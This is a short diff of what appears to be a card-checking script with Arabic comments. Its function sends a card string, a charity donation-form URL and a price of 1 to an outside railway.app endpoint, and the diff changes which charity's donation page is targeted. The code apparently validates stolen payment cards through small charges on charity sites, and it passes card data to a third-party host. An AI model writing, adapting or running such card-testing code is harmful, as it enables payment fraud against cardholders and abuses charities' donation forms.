@@ -4,7 +4,7 @@ def chkk(ccx):
     cc = ccx.strip()
     # هنا يجب تعديل الرابط حسب الموقع الذي تريد فحصه
     # مثلاً: https://brightercommunities.org/donate-form/
-    urll = "https://kunpen.ngalso.org/en/donations/open-donation/"  # ضع الرابط الكامل
+    urll = "https://ls26f.org/donations/63/"  # ضع الرابط الكامل
     price = "1"  # يمكن تغيير القيمة حسب المبلغ المطلوب
     res = requests.get(f'http://john-production.up.railway.app/pay?cc={cc}&url={urll}&price={price}').text
     return res
